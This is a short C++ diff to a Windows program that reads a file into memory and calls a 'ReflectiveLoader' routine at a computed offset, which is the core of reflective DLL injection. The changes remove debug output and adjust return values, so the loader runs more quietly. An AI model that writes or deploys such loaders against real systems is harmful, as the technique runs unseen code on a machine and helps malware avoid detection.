@@ -21,8 +21,6 @@ int run(int offset) {
     }
     DWORD bytesRead;
     if (ReadFile(hFile, buff, fileSize, &bytesRead, NULL)) {
-        cout << "PEAddress: " << buff << endl;
-        cout << "PE ReflectiveLoader Offset: " << hex << offset << endl;
         BYTE* ReflectiveLoader = ((BYTE*)buff + offset);
         BOOL state = ((BOOL(*)())ReflectiveLoader)();
         CloseHandle(hFile);
@@ -31,7 +29,7 @@ int run(int offset) {
     }
     CloseHandle(hFile);
     CloseHandle(heap);
-    return -1;
+    return 0;
 }
 
 DWORD GetOffset() {
@@ -68,11 +66,11 @@ bool SaveDllToFile() {
     return true;
 }
 
+
 int main() {
     DWORD offset = GetOffset();
     if (offset != NULL) {
         offset -= 0xc00;
-        cout << run(offset) << endl;
+        run(offset);
     }
-    //cout << hex << offset << endl;
 }
